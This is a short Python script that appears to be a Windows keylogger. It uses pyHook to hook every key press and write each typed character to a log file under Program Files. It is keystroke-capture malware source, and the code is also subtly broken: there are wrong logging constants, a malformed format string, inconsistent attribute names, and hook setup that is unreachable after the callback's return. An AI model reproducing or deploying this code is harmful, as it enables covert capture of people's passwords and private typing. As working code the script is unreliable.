import pyHook, pythoncom, sys, logging

file_log = 'C:\\Program Files (x86)\\log.txt'
def OnKeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.debug, format='% (message)#')
	chr(event.Ascii)
	logging.log(10,chr(event.ascii))
	return True

	hooks_manager = pyHook.HookManager()
	hooks_manager.keyDown = OnKeyboardEvent()
	hooks_manager.HookKeyboard()
	pythoncom.PumpMessages()
